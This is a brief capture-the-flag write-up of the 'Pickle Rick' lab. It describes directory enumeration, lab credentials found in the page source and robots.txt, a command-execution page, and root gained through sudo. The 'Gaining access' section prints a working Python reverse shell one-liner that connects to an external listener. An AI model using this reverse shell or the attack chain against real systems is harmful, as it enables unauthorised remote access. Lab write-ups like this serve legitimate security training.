# Pickle rick

## Enumeration
Scanning using rustscan shows 2 port are open, webserver and ssh server
Inspecting the source code, we found his username which is `R1ckRul3s`
Robots.txt shows a text that could be some kind of password? it is `Wubbalubbadubdub`
Not much info can be found right now so I enumerate the directory using gobuster
`gobuster dir -t 16 -u http://10.10.215.45/:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
Gobuster revealed login.php, visiting it and using the login credentials we are greeted with a command execution page

## Gaining access
With the command execution, testing out linux commands like ls -a revealed file content but this also means
we could potentially gain a reverse shell. We see that python3 is available and this can be used to get reverse shell
using `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
We are now able to read the content to retrieve the first ingredient.

The next ingredient can be found in the home directory 

Lastly, just trying out sudo bash allowed us to gain root so the last ingredient is probably in the root directory


